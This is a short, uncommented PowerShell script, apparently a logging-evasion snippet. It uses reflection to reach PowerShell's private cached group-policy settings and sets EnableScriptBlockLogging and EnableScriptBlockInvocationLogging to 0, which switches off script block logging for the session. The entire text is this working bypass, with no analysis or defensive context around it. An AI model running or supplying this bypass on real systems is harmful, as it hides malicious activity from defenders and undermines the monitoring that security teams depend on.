
$PSEventLog = Get-WinEvent -ListLog Microsoft-Windows-PowerShell/Operational

$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

$BypassValues = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
$BypassValues.Add('EnableScriptBlockLogging', '0')
$BypassValues.Add('EnableScriptBlockInvocationLogging', '0')

$GroupPolicySettings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $BypassValues


